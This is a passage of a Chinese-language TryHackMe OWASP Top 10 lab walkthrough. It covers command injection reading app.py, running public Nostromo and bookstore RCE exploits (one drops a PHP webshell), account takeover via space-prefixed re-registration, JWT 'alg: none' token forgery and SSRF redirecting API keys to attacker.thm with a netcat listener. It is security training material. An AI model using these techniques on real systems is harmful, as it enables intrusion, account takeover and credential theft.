#2. `os.popen("ls -l")` 执行命令，即`ls -l`，这个命令用于列出当前目录的详细信息。
#3. `.read()` 方法用于读取`ls -l`命令的输出。
#4. `print()` 函数用于将输出结果打印到控制台。

#此段代码的效果类似于在终端中运行`ls -l`命令，用于显示当前目录下文件和文件夹的详细信息；请注意，具体的输出内容将依赖于代码运行时所在的目录，如果你希望运行其他命令或者在不同目录下执行`ls -l`，你可以相应地更改`os.popen("ls -l")`中的命令。
```

我们可以看到，当前目录中的数据库文件名是什么？

![image-20240109224054293](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109224054293.png)

> 当前目录中的数据库文件名为：todo.db

修改我们刚才所使用的代码，以尝试读取`app.py`文件的内容，该文件包含了应用程序的源代码，我们可以看到源代码中`secret_flag`变量的值是？

```python
import os; print(os.popen("cat app.py").read())
```

![image-20240109224310586](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109224310586.png)

> 源代码中secret\_flag变量的值是：THM{Just\_a\_tiny\_misconfiguration} 。

![image-20240109224342647](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109224342647.png)

## \[TOP6]自带缺陷和过时的组件

有时候，我们可能会发现我们正在进行渗透测试的公司正在使用具有众所周知的、已公开的漏洞的应用程序。

例如，假设有一家公司已经几年没有更新他们的WordPress版本，通过使用诸如WPScan之类的工具进行扫描，我们发现了它是4.6版本的WordPress，经过调查我们还会发现WordPress 4.6版本容易受到未经身份验证的远程代码执行(RCE)漏洞攻击，而且我们还能在漏洞利用数据库**Exploit-db**中找到[相关的漏洞exp](https://www.exploit-db.com/exploits/41962)。

正如我们所能想到的那样，这将是一件非常具有破坏性的事情，在这种情况下攻击者只需要做很少的工作就能完成漏洞攻击，因为目标应用程序的相关漏洞已经众所周知，其他攻击者也可能已经利用过了该漏洞，所以，如果一家公司错过了他们所使用的应用程序的一次版本更新或者补丁更新，那么就可能会遭受到来自不法份子的网络攻击。

tips：在现实情况下，公司、企业往往很容易错过对应用程序的及时更新。

## 自带缺陷和过时的组件(漏洞利用示例)

如果目标应用程序具有已知漏洞，那么其实我们已经完成了大部分攻击工作，我们的主要任务就是找出目标软件的信息，并对其进行研究，直到找到相关的漏洞利用程序。

接下来，让我们通过一个Web应用程序示例来了解一下。

![image-20240108200505003](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108200505003.png)

假设目标服务器具有Nostromo Web服务器的默认页面，现在我们有了目标应用程序的版本号和软件名称，就可以使用[exploit-db](https://www.exploit-db.com/)来尝试找到这个特定版本的漏洞。

![image-20240108200916884](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108200916884.png)

> EXP链接：https://www.exploit-db.com/exploits/47837

注意：exploit-db 非常有用，对于网络安全初学者来说，可能会经常使用它。

如上图所示，我们找到了一个相关的漏洞利用脚本，让我们下载它并尝试执行代码，然而单独运行这个脚本的结果并未如我们所愿，它会给出如下所示的报错信息。

```shell
user@linux$ python 47837.py
Traceback (most recent call last):
  File "47837.py", line 10, in <module>
    cve2019_16278.py
NameError: name 'cve2019_16278' is not defined
```

有时候，初次执行exp可能不会成功生效，但是初次执行有助于我们了解脚本所使用的编程语言，以便在需要的时候，我们可以修复任何错误或进行任何修改，因为在Exploit-DB上的很多漏洞利用脚本都需要我们进行修改才能被成功执行。

幸运的是，本例中的exp执行错误是由本应被注释的代码行所引起的，因此我们很容易就能修复该exp，我们只需将以下代码行注释即可：

```python
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

cve2019_16278.py  # This line needs to be commented. 注释这行代码

#!/usr/bin/env python
```

解决以上问题之后，让我们再次尝试运行exp：

```shell
user@linux$ python 47837.py 127.0.0.1 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Fri, 03 Feb 2023 04:58:34 GMT
Server: nostromo 1.9.6
Connection: close

uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
```

我们成功执行了RCE，需要注意的是，大多数exp脚本只会告诉我们需要给它提供哪些参数以便完成漏洞利用过程，exp开发人员很少会让我们为了弄清楚如何使用脚本而去阅读数百行代码。

有时我们会很容易得到应用程序的版本号，但其他时候我们可能还需要深入挖掘HTML源代码，或者需要猜测一个能够被成功使用的漏洞利用脚本；如果目标应用程序的相关漏洞是一个已知漏洞，则总有办法可以尝试发现目标应用程序的当前版本信息。

## 自带缺陷和过时的组件(操作实践)

部署目标虚拟机，使用攻击机的浏览器导航到`http://MACHINE_IP:84`并尝试进行漏洞利用。

### 答题

首先在攻击机上使用浏览器访问`http://MACHINE_IP:84`(10.10.206.41:84)页面。

![image-20240109225954149](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109225954149.png)

在 https://www.exploit-db.com/ 中搜索目标应用程序(online book store)，并下载相关的EXP：

![image-20240109230041674](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109230041674.png)

![image-20240109230118608](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109230118608.png)

在攻击机上使用exp，指定目标url参数：

```python
python 47887.py http://10.10.206.41:84/
```

![image-20240109230541087](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109230541087.png)

使用我们所获得的shell查看`/opt/flag.txt`文件内容：

![image-20240109230636813](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109230636813.png)

tips：执行上述exp，会将一个php webshell文件上传到`http://10.10.206.41:84/bootstrap/img/`目录下。

![image-20240109231058189](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231058189.png)

> /opt/flag.txt的内容为：THM{But\_1ts\_n0t\_my\_f4ult!} 。

![image-20240109230722315](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109230722315.png)

## \[TOP7]身份识别和身份验证错误

![image-20240108205910872](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108205910872.png)

身份验证和会话(session)管理构成了现代Web应用程序的核心组件。身份验证允许用户通过验证其身份来访问Web应用程序，最常见的身份验证形式是使用用户名和密码机制；用户需要输入密码凭据，然后服务器将验证它是否正确，如果用户所提供的凭据是正确的，那么服务器将向用户的本地浏览器提供一个会话cookie。之所以需要会话cookie，是因为Web服务器将使用无状态的HTTP(S)协议和客户端进行通信，通过附加会话cookie意味着服务器将知道是谁在发送什么数据，然后服务器就可以跟踪用户的操作。

如果攻击者能够发现身份验证机制中的缺陷，他们就可以成功访问其他用户所对应的帐户，这将允许攻击者能够访问某些敏感数据(取决于应用程序的目的)。身份验证机制中的一些常见缺陷包括：

* 暴力破解攻击：如果Web应用程序使用用户名和密码作为身份验证机制，攻击者就可以尝试发起暴力破解攻击，该攻击将允许攻击者通过多次身份验证尝试来猜测有效的用户名和密码，一旦破解成功攻击者就能非法绕过身份验证机制。
* 使用弱凭据：Web应用程序应该设置强密码策略，如果应用程序允许用户设置诸如“password1”或其他常用密码之类的弱验证凭据，那么攻击者就能够轻松猜解出这些凭据并实现对用户帐户的访问。
* 弱会话Cookie：会话(Session)Cookie 是服务器跟踪用户操作的方式，如果会话cookie包含的是一些可预测的值，那么攻击者就可以伪造会话cookie并实现对用户帐户的访问。

根据具体的身份验证机制缺陷，可以有多种针对损坏的身份验证机制的缓解措施：

* 为了防御密码猜测攻击，请确保Web应用程序强制执行强密码策略。
* 为了防御暴力破解攻击，请确保Web应用程序在一定次数的失败验证尝试后，能够强制执行自动锁定，这将防止攻击者发起更多的暴力破解攻击尝试。
* 实施多因素身份验证措施，如果用户有多种身份验证方法，例如，在使用用户名和密码机制的同时还要求用户在绑定的移动设备上接收短信验证码，这样攻击者就很难同时提供两种凭据(密码、验证码)来访问目标用户的帐户。

## 身份识别和身份验证错误(操作实践)

本小节将通过一个示例来研究身份验证机制中的逻辑缺陷。

当开发人员忘记清理用户在Web应用程序代码中提供的输入(用户名和密码)时，可能会使目标Web应用程序容易受到SQL注入等攻击；但是，在此处我们将重点关注一个由于开发人员的错误而导致的逻辑缺陷，即：关于“已存在的用户”的重新注册问题。

例子：假设有一个名为"admin"的现有用户，现在我们想访问"admin"帐户，我们可以尝试对用户名稍作修改并重新注册用户名，进入用户名注册页面：在用户名字段中输入" admin"(注意此用户名开头含有空格)，然后接着输入其他必需信息(如电子邮件ID或密码等)并提交数据，该操作会注册一个新用户，但是该用户将拥有与普通管理员相同的权限，通过登录这个新用户我们就能看到"admin"用户权限所能访问的页面内容。

要查看实际效果，请访问`http://MACHINE_IP:8088`并尝试注册名为"darren"的用户，我们会看到一个提示"该用户已存在"，我们继续尝试注册名为" darren"的用户(注意此用户名开头含有空格)，注册完成之后进行登录操作，我们就能看到"darren"帐户中存在的内容。

### 答题

部署目标虚拟机，使用攻击机上的浏览器导航至`http://MACHINE_IP:8088`(10.10.206.41:8088)页面：

![image-20240109231258782](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231258782.png)

注册名为“ darren”的用户（注意此用户名开头含有空格），然后登录新用户帐户并查看flag内容：

![image-20240109231421567](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231421567.png)

![image-20240109231545945](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231545945.png)

![image-20240109231559778](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231559778.png)

> 在darren用户帐户中找到的flag是：fe86079416a21a3c99937fea8874b667

验证一下能否以同样的方式查看arthur用户帐户中的信息：

![image-20240109231849658](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231849658.png)

![image-20240109231955511](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109231955511.png)

![image-20240109232013123](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232013123.png)

> 在arthur用户帐户中找到的flag是：d9ac0f7db4fda460ac3edeb75d75e16e

![image-20240109232102814](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232102814.png)

## \[TOP8]软件和数据完整性故障

**什么是完整性？**

当谈论到完整性时，我们指的是我们能够确定一段数据未被修改的能力。

完整性对于网络安全至关重要，因为我们需要维护重要数据免受不必要或恶意的修改，例如，假设我们正在下载某个软件的最新安装程序，那么我们应该思考一个问题——如何确定在下载该安装程序时它没有在传输过程中被修改或者因传输错误而被损坏？

为了解决刚才的问题，我们经常会看到与文件一起被发送的哈希值，该哈希值可以方便证明我们所下载的文件保持了完整性并且在传输过程中没有被修改。

tips：Hash是对一段数据应用特定的算法而产生的值，常见的哈希算法有MD5、SHA1、SHA256等。

让我们以WinSCP为例，以便更好地理解如何通过哈希值来检查文件的完整性。如果我们访问WinSCP的[Sourceforge存储库](https://sourceforge.net/projects/winscp/files/WinSCP/5.21.5/)，我们会看到对于每个可供下载的相关文件，存储库页面都会发布一些对应的hash值：

![image-20240108212635900](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108212635900.png)

这些哈希值是由WinSCP的创建者预先计算得到的，以便我们可以在完成下载后检查文件的完整性，如果我们下载了`WinSCP-5.21.5-Setup.exe`文件，我们就可以重新计算该文件的hash值并将其与WinSCP的Sourceforge存储库中所发布的哈希值进行比较，从而验证文件的完整性。

要在Linux中计算hash值，我们可以使用以下命令：

```shell
user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe          
20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe
                                                                                                                
user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe 
c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe
                                                                                                                
user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe 
e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
```

如果我们通过计算得到了相同的哈希值，那么我们就可以放心地得出结论：我们所下载的文件与应用程序发布页所提供的文件完全相同。

**软件和数据完整性故障**

此漏洞是因为用户在使用代码或基础设施时没有针对相关的软件或数据经过任何类型的完整性检查而引起的，由于没有进行完整性验证，攻击者就可能会修改软件或数据然后再传递给目标应用程序，从而导致难以预料的后果，该漏洞主要有两类：

* Software Integrity Failures：软件完整性故障；
* Data Integrity Failures：数据完整性故障。

## 软件完整性故障

**概念介绍**

假设现在你有一个网站，该网站会使用第三方库，而这些库是存储在一些不受你控制的外部服务器中；虽然听起来很奇怪，但是这实际上是一种常见的做法。以常用的JavaScript库jQuery为例，如果需要的话，你可以直接从jQuery官方服务器将jQuery添加到你的网站中，而无需实际下载它，你只需在网站的HTML代码中添加以下行即可：

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```

这样，当用户导航到你的网站时，用户的浏览器将读取网站的HTML代码并从指定的外部源加载JQuery。

![image-20240109112709136](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109112709136.png)

现在的问题是，如果攻击者以某种方式侵入了jQuery官方存储库，那么他们就可以更改`https://code.jquery.com/jquery-3.6.1.min.js`的内容以注入恶意代码；这样，任何访问你的网站的用户都会在不知不觉中提取恶意代码并将其在本地浏览器中执行。这属于软件完整性故障，因为你的网站没有很好地检查第三方库以查看其是否被修改过。现在的浏览器允许你根据第三方库的URL来规定hash值，以便仅当已下载的库文件的哈希值与预定值相匹配时才执行库代码，这种安全机制被称为子资源完整性(SRI)，你可以在[SRI相关文档页](https://www.srihash.org/)查看该机制的更多信息。

在HTML代码中插入第三方库的正确方法是使用SRI机制并且包含一个用于验证完整性的哈希，这样即使攻击者能够以某种方式修改库，任何浏览你网站的客户端也都不会执行被修改后的库文件。此时，网站的HTML代码中应具有如下内容：

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```

如果需要的话，你可以访问`https://www.srihash.org/`来为任何库生成对应的哈希值。

### 答题

`https://code.jquery.com/jquery-1.12.4.min.js`库文件的SHA-256哈希值是什么？

我们先访问：https://www.srihash.org/

![image-20240109115017277](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109115017277.png)

然后使用上述网站页面来计算 `https://code.jquery.com/jquery-1.12.4.min.js`库文件的SHA-256哈希：

![image-20240109115124003](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109115124003.png)

![image-20240109115140530](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109115140530.png)

```html
<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
```

最终我们得到的SHA-256哈希值为：`sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`

![image-20240109115353736](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109115353736.png)

## 数据完整性故障

**概念介绍**

首先，让我们考虑一下Web应用程序是如何维护会话的，通常，当用户登录到Web应用程序时，他们将被分配得到某种会话令牌，只要用户想让当前会话持续，就需要将这些令牌保存在他们的本地浏览器中。

会话令牌将在后继的每个请求中被重复使用，以便Web应用程序知道我们是谁。这些令牌可以有多种形式，但通常是通过cookies进行分配的；**Cookies**是Web应用程序将会存储在用户浏览器上的键值对，并且会在用户每次向Web站点发送请求时自动重复使用。

![image-20240109131617787](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109131617787.png)

例如，如果你正在创建一个Web邮件应用程序，则可以在用户登录后为他们分配一个包含用户名的cookie，这样在后继请求中，用户的浏览器将始终通过cookie发送用户名，以便你的Web应用程序知道哪个用户正在请求连接；但是从安全的角度来看，这并不是一个很好的工作流程，由于cookie是存储在用户的浏览器上的，所以如果攻击者篡改cookie并修改用户名，那么他们就可能会冒充其他用户身份并阅读其他用户的电子邮件内容。我们可以说该应用程序存在数据完整性故障，因为它会信任“攻击者可篡改的数据”。

解决此类问题的一种方法是使用完整性检查机制来保证cookie没有被攻击者所更改，而JSON Web Tokens (JWT)就是这样的一种实现。

JWTs是一种非常简单的令牌，它在允许你存储键值对的同时还能提供相关的完整性检查，通过使用JWT，你可以生成令牌、向用户提供这些令牌，还能通过完整性检查确保攻击者无法更改令牌中的键值对。JWT令牌的结构由以下3部分组成：

![image-20240109182145759](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109182145759.png)

如上图所示，令牌的标头部分会包含元数据以指示这是JWT并且使用的签名算法是HS256。令牌的Payload(有效载荷)部分会包含键值对以及Web应用程序希望浏览器客户端存储的数据。令牌的签名部分则类似于哈希值，可用于验证Payload的完整性，一旦你更改了令牌的Payload部分，那么Web应用程序就可以通过验证得知签名与Payload不匹配，从而得知你篡改了JWT。

与简单的哈希值不同，JWT令牌中的签名还涉及到使用仅由服务器持有的密钥，这意味着一旦攻击者更改了令牌的Payload部分，除非知道密钥，否则攻击者将无法生成相匹配的签名。

请注意，JWT令牌三部分中的每一部分都是使用Base64编码处理过的简单明文，你可以使用一些在线工具来编码/解码Base64文本，例如我们可以尝试解码以下令牌中的标头、有效载荷、签名：

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw`

注意：JWT令牌中的签名包含了二进制数据，所以即使我们对其进行解码，也无法直接理解签名的含义。

**JWT和None算法**

某些实现JWT的库可能会存在“数据完整性故障”漏洞，正如我们上文所述，JWT实现了数字签名来验证令牌的Payload部分的数据完整性，而易受攻击的库允许攻击者通过更改JWT中的以下两项来绕过签名验证：

1. 修改令牌的标头部分，让标头中的`alg`值为`none`；
2. 删除令牌中的签名部分。

以我们上文所述的JWT为例，如果我们想更改JWT令牌的Payload部分(使用户名变为“admin”并且不做签名检查)，那么我们必须先解码令牌的标头、有效载荷，然后再根据需要修改它们，最后再进行重新编码处理。

![image-20240109191841062](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109191841062.png)

### 答题

部署目标虚拟机，使用攻击机上的浏览器导航至`http://MACHINE_IP:8089`(10.10.206.41:8089)页面：

![image-20240109232248145](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232248145.png)

尝试使用guest用户和随机密码登录上面的应用程序：

![image-20240109232454341](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232454341.png)

> guest用户的默认密码为：guest

![image-20240109232833979](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232833979.png)

现在我们能够以guest用户身份(使用密码guest)登录应用程序了，我们可以在本地浏览器中按F12调出开发者工具，以查看cookie的存储情况：

![image-20240109232733123](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109232733123.png)

![image-20240109233014061](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109233014061.png)

> 包含JWT令牌的网站cookie的名称是：jwt-session

![image-20240109233114622](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109233114622.png)

接下来，让我们尝试修改本地浏览器中的JWT令牌，以便让当前的Web应用程序以为我们是admin用户。

我们先复制并解码本地浏览器中的guest用户的JWT令牌值：

```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzA0ODE2NjMyfQ.Kl3vgRZoIy8B9l4a6hc0te8QfGfr32m1NZNr1-7Wjnk

#分别对令牌的标头和有效载荷部分进行base64解码：
#标头部分：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
#有效载荷部分：eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzA0ODE2NjMyfQ
#签名部分直接做删除处理即可。
```

我们使用在线Base64编码/解码工具进行操作：https://appdevtools.com/base64-encoder-decoder

![image-20240109234124398](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109234124398.png)

![image-20240109234154717](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109234154717.png)

```shell
#head
{"typ":"JWT","alg":"HS256"}

#payload
{"username":"guest","exp":1704816632}
```

我们对上述解码后的令牌部分进行修改(将令牌标头中的`alg`值改为`none`，将令牌有效载荷中的`username`值改为`admin`)，然后再重新进行Base64编码处理。

```shell
#head
{"typ":"JWT","alg":"none"}

#payload
{"username":"admin","exp":1704816632}
```

![image-20240109235134223](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109235134223.png)

![image-20240109235218556](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109235218556.png)

以点号为间隔，重新组合得到的新JWT令牌值如下所示：

```shell
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzA0ODE2NjMyfQ==.
#注意末尾也需要.号。
#签名部分直接做了删除处理，所以新的JWT令牌现在没有签名部分。
```

回到我们的本地浏览器界面，我们用新的JWT令牌替换之前的guest用户的JWT令牌值，然后我们刷新浏览器页面即可获取flag：

![image-20240109235801281](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109235801281.png)

![image-20240109235848879](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109235848879.png)

> 得到的flag为：THM{Dont\_take\_cookies\_from\_strangers} 。

![image-20240109235936626](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109235936626.png)

## \[TOP9]安全日志和监控故障

在设置Web应用程序时，应该记录用户执行的每个操作。这些日志记录很重要，因为一旦发生安全事件，日志就可以用于追踪攻击者的活动；一旦追踪到攻击者的活动，就可以确定他们所进行的行为的安全风险和安全影响。 如果没有日志记录，那么就无法判断攻击者在获得对特定Web应用程序的访问权限之后，具体执行了哪些操作，安全日志和监控故障的显著影响包括：

* 监管上的损失：如果攻击者获得了对用户个人身份信息的访问权限并且没有留下相关的日志记录，那么不仅应用程序的用户本身会受到安全影响，该应用程序的所有者也可能会依据当地法律法规受到罚款或其他更严厉的处罚。
* 攻击者发起进一步攻击的风险：如果没有相关的日志记录，则可能无法检测到攻击者的存在，这可能允许攻击者通过窃取凭据、攻击基础设施等方式来对Web应用程序所有者发起进一步的攻击。

安全日志文件中所存储的信息应包括以下内容：

* HTTP status codes（HTTP状态码）
* Time Stamps（时间戳）
* Usernames（用户名）
* API endpoints/page locations（API端点/页面位置）
* IP addresses（IP地址）

因为日志文件会包含一些敏感信息，所以确保安全地存储日志文件以及将这些日志的多个副本存储在不同位置非常重要。

你可能已经注意到，在发生网络安全违规或事件后，日志记录会变得尤为重要。理想的情况是：目标应用程序能够进行监控以检测任何可疑活动，而检测这种可疑活动的目的要么是为了完全阻止攻击者，要么是当检测到攻击者的时间比预期晚得多时(例如，在攻击者入侵十天之后才检测到)尽可能地减少攻击者所造成的影响。

可疑活动的常见示例包括：

* 针对特定操作进行多次未经授权的尝试：通常是身份验证尝试或者访问未经授权的资源(例如管理员页面)。
* 来自异常 IP 地址或位置的请求：这可能表明其他人正在尝试访问特定用户的帐户(针对该活动的检测具有一定误报率)。
* 使用了自动化工具：特定的自动化工具可以很容易地被识别到，例如，检测用户所使用的User-Agent标头的值或用户发送请求的速率，出现这些特征可能表明攻击者正在使用自动化攻击工具。
* 使用了常见的有效载荷(Payload)：在Web应用程序中，攻击者可能会使用一系列已知的有效载荷，通过检测这些有效载荷的使用情况，就可以得知是否有人在对目标应用程序进行未经授权或恶意的测试。

仅仅检测可疑活动还不够，网络安全防御人员还需要根据事件影响级别对可疑活动进行评级；例如某些攻击行为会比其他攻击行为产生更大的影响，这些影响较大的可疑活动往往需要优先做应急响应，因此防御人员应该针对性地发出告警，以引起公司相关部门的注意。

接下来，我们需要通过分析示例日志文件来实践本小节的知识点。

### 答题

在与本小节相关的Tryhackme实验房间中，单击`Download Task Files` 按钮以下载要分析的示例日志文件。

![image-20240109192110074](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109192110074.png)

我们打开已下载的示例日志文件并查看其内容：

![image-20240109192321809](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109192321809.png)

分析该日志文件的内容可知：

1.在短时间内有人进行了四次登录操作，对应的可疑ip地址为：49.99.13.16；

2.四次登录操作使用的是不同的用户名，所以相关的一系列行为属于：暴力破解攻击（Brute Force）。

![image-20240109192446654](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240109192446654.png)

## \[TOP10]服务器端请求伪造(SSRF)

这种类型的漏洞发生在攻击者能够强制Web应用程序代表其向任意目标发送请求的情况下，同时攻击者还可以控制请求本身的内容，SSRF漏洞通常出现在需要使用第三方服务的Web应用程序的具体实现中。

tips：SSRF(Server-Side Request Forgery)服务器端请求伪造。

例如，考虑一个使用外部API向其客户端发送SMS通知的Web应用程序。对于每封电子邮件，网站都需要向SMS提供商的服务器发出Web请求，以便发送想要发送的消息内容。由于SMS服务提供商是按每条消息计费的，因此他们会要求你在向其API发出的每个请求中添加一个他们预先分配给你的密钥；这个API密钥将充当身份验证令牌，使得SMS服务提供商能够知道要向哪个用户计费每条消息。该Web应用程序的相关工作流程如下：

![image-20240108224740319](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240108224740319.png)

通过查看上图内容，我们很容易看出漏洞所在，应用程序向用户公开了`server`参数，该参数定义了SMS服务提供商的服务器名称；如果攻击者愿意，他们就可以通过简单地修改`server`值以指向由其所控制的计算机设备，然后Web应用程序就会将SMS请求转发给攻击者而不是SMS服务提供商。作为被转发的消息的一部分，攻击者还能获取到API密钥，从而允许他们使用SMS服务发送消息，而费用则由网站所有者承担。为了实现刚才所描述的效果，攻击者只需要向目标Web应用程序发送以下请求：

`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`

这将使得存在SSRF漏洞的Web应用程序自动发送以下请求：

`https://attacker.thm/api/send?msg=ABC`

然后，攻击者可以在由他们所控制的计算机设备上使用Netcat来捕获相关请求的内容：

```shell
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```

这是SSRF漏洞的一个非常基础的案例，实际上SSRF可以用来做更多的事情，根据每个场景的情况，SSRF一般可用于：

* 枚举内部网络，包括IP地址和端口等信息；
* 滥用服务器之间的信任关系，并获取对其他受限服务的访问权限；
* 与一些非HTTP服务交互以实现远程代码执行(RCE)。

接下来，让我们通过实例来快速了解一下如何使用SSRF来滥用某些信任关系。

### 答题

部署目标虚拟机，使用攻击机上的浏览器导航至`http://MACHINE_IP:8087/`(10.10.206.41:8087)页面，我们将在该页面找到一个简单的Web应用程序，经过一番探索之后，我们可以看到一个admin区域，这将会是我们的主要测试目标。

